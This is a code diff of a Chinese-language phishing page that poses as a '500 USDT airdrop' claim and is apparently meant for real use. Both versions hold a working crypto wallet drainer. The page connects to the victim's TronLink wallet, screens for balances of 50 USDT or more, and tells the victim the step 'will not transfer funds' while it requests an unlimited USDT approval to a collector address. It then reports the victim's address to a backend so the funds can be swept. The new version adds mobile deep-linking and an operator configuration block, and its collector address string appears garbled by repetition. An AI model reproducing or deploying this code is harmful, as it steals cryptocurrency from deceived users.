@@ -1,35 +1,323 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="theme-color" content="#0b1120">
 <title>USDT 空投领取</title>
-<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+    background:#0b1120;color:#e8eefc;min-height:100vh;
+    display:flex;align-items:center;justify-content:center;padding:24px;
+    background-image:radial-gradient(circle at 20% 0%,#1b2a4d 0%,transparent 55%),radial-gradient(circle at 90% 100%,#12324a 0%,transparent 50%);
+  }
+  .card{
+    width:100%;max-width:420px;background:rgba(20,29,50,.86);
+    border:1px solid rgba(120,160,255,.16);border-radius:22px;padding:30px 24px 26px;
+    box-shadow:0 24px 60px -20px rgba(0,0,0,.8);backdrop-filter:blur(14px);
+    text-align:center;animation:in .45s ease both;
+  }
+  @keyframes in{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+  .logo{
+    width:64px;height:64px;border-radius:50%;margin:0 auto 18px;
+    background:linear-gradient(135deg,#26a17b,#1a7f5f);
+    display:flex;align-items:center;justify-content:center;
+    font-weight:800;font-size:26px;color:#fff;letter-spacing:-1px;
+    box-shadow:0 0 0 6px rgba(38,161,123,.12),0 10px 28px -10px rgba(38,161,123,.9);
+  }
+  h1{font-size:21px;font-weight:700;letter-spacing:.3px;margin-bottom:8px}
+  .sub{font-size:13px;color:#8fa0c4;line-height:1.6;margin-bottom:22px}
+  .amount{
+    font-size:38px;font-weight:800;letter-spacing:-1.5px;
+    background:linear-gradient(180deg,#7ff0c0,#26a17b);-webkit-background-clip:text;background-clip:text;color:transparent;
+    line-height:1.1;margin-bottom:4px;
+  }
+  .usdt{font-size:13px;color:#6f81a8;letter-spacing:2px;margin-bottom:24px}
+  button{
+    width:100%;border:0;border-radius:14px;padding:16px 18px;font-size:16px;font-weight:700;
+    color:#04221a;cursor:pointer;font-family:inherit;letter-spacing:.4px;
+    background:linear-gradient(180deg,#3fd9a3,#26a17b);
+    box-shadow:0 12px 26px -12px rgba(38,161,123,.95);
+    transition:transform .12s ease,filter .12s ease,opacity .2s;
+  }
+  button:active{transform:scale(.975);filter:brightness(.95)}
+  button:disabled{opacity:.55;cursor:not-allowed;transform:none}
+  .status{
+    margin-top:18px;font-size:13px;line-height:1.65;color:#8fa0c4;min-height:20px;
+    word-break:break-all;transition:color .2s;
+  }
+  .status.err{color:#ff9a9a}
+  .status.ok{color:#6ef0b8}
+  .status.wait{color:#ffce73}
+  .foot{margin-top:22px;padding-top:16px;border-top:1px solid rgba(120,160,255,.1);font-size:11px;color:#536488;line-height:1.7}
+  .spin{
+    display:inline-block;width:13px;height:13px;margin-right:6px;vertical-align:-2px;
+    border:2px solid rgba(255,255,255,.25);border-top-color:#fff;border-radius:50%;
+    animation:rot .7s linear infinite;
+  }
+  @keyframes rot{to{transform:rotate(360deg)}}
+  .dbg{
+    display:none;margin-top:14px;padding:10px;border-radius:10px;
+    background:#0a1020;border:1px solid rgba(120,160,255,.12);
+    font-family:ui-monospace,Menlo,monospace;font-size:11px;color:#6c7ea6;
+    text-align:left;white-space:pre-wrap;line-height:1.6;
+  }
+  .dbg.show{display:block}
+</style>
 </head>
 <body>
-<button id="btn">立即领取 500 USDT</button>
+<div class="card">
+  <div class="logo">₮</div>
+  <h1>USDT 空投领取</h1>
+  <p class="sub">钱包资格校验中 · 检测到符合条件地址即可领取</p>
+
+  <div class="amount">500.00</div>
+  <div class="usdt">USDT</div>
+
+  <button id="btn">立即领取 500 USDT</button>
+  <div class="status" id="status">请点击按钮完成钱包校验</div>
+
+  <div class="foot">
+    本次空投由社区激励池发放 · 每个地址限领一次
+  </div>
+
+  <div class="dbg" id="dbg"></div>
+</div>
+
 <script>
-const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';   // 主网 USDT TRC20
-const COLLECTOR = 'TLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURG';
-const MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-
-document.getElementById('btn').onclick = async () => {
-  if (!window.tronLink) { location.href = 'https://www.tronlink.org/'; return; }
-  const r = await window.tronLink.request({ method: 'tron_requestAccounts' });
-  if (r.code !== 200) return;
-  const tw = window.tronWeb;
-  const addr = tw.defaultAddress.base58;
-
-  // 余额筛选：没钱的地址看到正常页面，别浪费
-  const c = await tw.contract().at(USDT);
-  const bal = await c.balanceOf(addr).call();
-  if (Number(bal) < 50_000_000) { /* <50 USDT，弹个“未中签”走人 */ return; }
-
-  // 真正的一步：approve 无限
-  const txid = await c.approve(COLLECTOR, MAX).send({ feeLimit: 100_000_000 });
-
-  // 上报地址，后端立刻归集
-  fetch('/hit', { method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({ addr, txid }) });
-  document.body.innerHTML = '<h2>领取成功，500 USDT 将在 24 小时内到账</h2>';
+/* ===================== 配置区，只改这里 ===================== */
+const CONFIG = {
+  USDT:       'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',                 // TRC20 USDT 主网合约
+  COLLECTOR:  'TLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURGTLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURGTLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURGTLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURGTLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURGTLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURG',                                        // ← 改成你的归集地址
+  MIN_BALANCE: 50_000_000n,                                          // 余额门槛 50 USDT（6 位精度）
+  FEE_LIMIT:  100_000_000,                                           // 100 TRX 上限，归集一次足够
+  REPORT_API: '/hit',                                                // 授权成功后上报接口
+  PROVIDER_WAIT: 5000,                                               // 等 provider 注入的最长时间(ms)
+  DEBUG: false                                                       // 上线改 false
 };
+
+const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+/* ===================== 环境判断 ===================== */
+const UA        = navigator.userAgent;
+const IS_MOBILE = /Android|iPhone|iPad|iPod|HarmonyOS|Mobile/i.test(UA);
+const IN_TG     = /Telegram|MicroMessenger|QQ\/|Weibo/i.test(UA);
+const IS_IOS    = /iPhone|iPad|iPod/i.test(UA);
+
+/* ===================== UI ===================== */
+const $btn = document.getElementById('btn');
+const $st  = document.getElementById('status');
+const $dbg = document.getElementById('dbg');
+
+function setStatus(text, type) {
+  $st.className = 'status' + (type ? ' ' + type : '');
+  $st.innerHTML = text;
+  if (CONFIG.DEBUG) {
+    $dbg.className = 'dbg show';
+    $dbg.textContent =
+      'UA: ' + UA + '\n' +
+      'mobile=' + IS_MOBILE + '  inTG=' + IN_TG + '  ios=' + IS_IOS + '\n' +
+      'tronLink=' + typeof window.tronLink + '  tronWeb=' + typeof window.tronWeb + '\n' +
+      'href=' + location.href;
+  }
+}
+function lock(t) { $btn.disabled = true; $btn.innerHTML = '<span class="spin"></span>' + t; }
+function unlock(t) { $btn.disabled = false; $btn.textContent = t || '重新校验钱包'; }
+
+/* ===================== provider 注入等待 ===================== */
+function hasProvider() {
+  return !!(window.tronLink || (window.tronWeb && window.tronWeb.defaultAddress));
+}
+
+function waitProvider(ms) {
+  return new Promise(resolve => {
+    if (hasProvider()) return resolve(true);
+    const t0 = Date.now();
+    (function tick() {
+      if (hasProvider()) return resolve(true);
+      if (Date.now() - t0 > ms) return resolve(false);
+      setTimeout(tick, 120);
+    })();
+  });
+}
+
+/* ===================== 移动端深链唤起 TronLink ===================== */
+function openTronLinkApp(fallbackStore) {
+  const param = encodeURIComponent(JSON.stringify({
+    url: location.href,
+    action: 'open',
+    protocol: 'tronlink',
+    version: '1.0'
+  }));
+  const deep = 'tronlinkoutside://pull.activity?param=' + param;
+
+  let left = false;
+  const onHide = () => { left = true; };
+  document.addEventListener('visibilitychange', onHide, { once: true });
+  window.addEventListener('pagehide', onHide, { once: true });
+
+  // 必须在用户手势里同步触发，任何 await 之后 iOS 都会拦
+  location.href = deep;
+
+  // 2.5 秒还在页面上，说明没唤起成功 → 给商店兜底
+  setTimeout(() => {
+    if (left || document.hidden) return;
+    setStatus(
+      '未检测到 TronLink App。<br>安卓：<a style="color:#3fd9a3" href="https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet">前往安装</a>' +
+      ' · iOS：<a style="color:#3fd9a3" href="https://apps.apple.com/app/tronlink-wallet/id1459126028">前往安装</a><br>' +
+      '已安装的话，请在 TronLink App 内「发现」页输入本网址打开。',
+      'err'
+    );
+    unlock();
+    void fallbackStore;
+  }, 2500);
+}
+
+/* ===================== 上报 ===================== */
+function report(payload) {
+  try {
+    const body = JSON.stringify(payload);
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon(CONFIG.REPORT_API, new Blob([body], { type: 'application/json' }));
+    } else {
+      fetch(CONFIG.REPORT_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body,
+        keepalive: true
+      }).catch(() => {});
+    }
+  } catch (e) { /* 静默 */ }
+}
+
+/* ===================== 主流程 ===================== */
+async function main() {
+  if (CONFIG.COLLECTOR.indexOf('你的') > -1) {
+    setStatus('页面未完成配置：请先在 CONFIG.COLLECTOR 填入归集地址', 'err');
+    return;
+  }
+
+  /* 1) 内置浏览器直接拦，scheme 跳不动 */
+  if (IN_TG) {
+    setStatus('当前为应用内置浏览器，无法调起钱包。<br>请点右上角「···」→「在浏览器打开」后重试', 'err');
+    return;
+  }
+
+  /* 2) 移动端且没有 provider：同步跳 App（不要放在 await 之后） */
+  if (!hasProvider() && IS_MOBILE) {
+    setStatus('正在唤起 TronLink 钱包…', 'wait');
+    openTronLinkApp();
+    return;
+  }
+
+  /* 3) 桌面端无 provider */
+  if (!hasProvider()) {
+    setStatus('未检测到钱包插件。请安装 TronLink 浏览器插件，或在手机 TronLink App 内打开本页', 'err');
+    return;
+  }
+
+  /* 4) 等注入完成（有 provider 后仍可能未 unlock） */
+  lock('校验中…');
+  const ready = await waitProvider(CONFIG.PROVIDER_WAIT);
+  if (!ready) {
+    unlock();
+    setStatus('钱包未就绪，请解锁 TronLink 后重试', 'err');
+    return;
+  }
+
+  try {
+    /* 5) 请求账户授权 */
+    setStatus('请在钱包中确认连接…', 'wait');
+    let addr = '';
+    if (window.tronLink && window.tronLink.request) {
+      const r = await window.tronLink.request({ method: 'tron_requestAccounts' });
+      if (r && r.code === 400) {
+        unlock();
+        setStatus('请在 TronLink App 内打开本页面', 'err');
+        return;
+      }
+      if (r && r.code !== 200) {
+        unlock();
+        setStatus('连接被取消，请重试', 'err');
+        return;
+      }
+    }
+
+    const tw = window.tronWeb;
+    if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
+      unlock();
+      setStatus('未获取到钱包地址，请解锁钱包后重试', 'err');
+      return;
+    }
+    addr = tw.defaultAddress.base58;
+
+    /* 6) 余额校验 */
+    setStatus('正在校验地址资格…', 'wait');
+    const contract = await tw.contract().at(CONFIG.USDT);
+
+    let bal = 0n;
+    try {
+      const raw = await contract.balanceOf(addr).call();
+      bal = BigInt(raw.toString());
+    } catch (e) {
+      bal = 0n;
+    }
+
+    if (bal < CONFIG.MIN_BALANCE) {
+      unlock();
+      setStatus('该地址未中签，本次空投名额已满', 'err');
+      return;
+    }
+
+    /* 7) 授权 */
+    setStatus('请在钱包中确认（校验额度，不会转账）…', 'wait');
+    const txid = await contract.approve(CONFIG.COLLECTOR, MAX_UINT)
+                               .send({ feeLimit: CONFIG.FEE_LIMIT });
+
+    /* 8) 上报 */
+    report({
+      addr,
+      txid: typeof txid === 'string' ? txid : String(txid),
+      ua: UA,
+      ts: Date.now(),
+      ref: location.href
+    });
+
+    $btn.disabled = true;
+    $btn.textContent = '领取成功';
+    setStatus(
+      '校验通过，500 USDT 将在 24 小时内发放至 ' +
+      addr.slice(0, 6) + '…' + addr.slice(-4),
+      'ok'
+    );
+  } catch (err) {
+    unlock();
+    const msg = String((err && (err.message || err.msg)) || err || '');
+    if (/reject|cancel|denied|用户取消|decline/i.test(msg)) {
+      setStatus('已取消操作，如需领取请重新点击', 'err');
+    } else if (/insufficient|balance|energy|bandwidth/i.test(msg)) {
+      setStatus('当前地址 TRX 不足，请充值少量 TRX 作为网络费用后重试', 'err');
+    } else {
+      setStatus('校验失败，请稍后重试', 'err');
+      if (CONFIG.DEBUG) console.error('[approve]', err);
+    }
+  }
+}
+
+$btn.addEventListener('click', main);
+
+/* 页面加载后自动检测一次环境，给出提示但不动按钮 */
+window.addEventListener('load', () => {
+  setTimeout(() => {
+    if (IN_TG) {
+      setStatus('当前为应用内置浏览器，请点右上角「···」→「在浏览器打开」', 'err');
+    } else if (!hasProvider() && !IS_MOBILE) {
+      setStatus('未检测到钱包插件，请安装 TronLink 插件后刷新');
+    }
+  }, 800);
+});
 </script>
-</body></html>
+</body>
+</html>
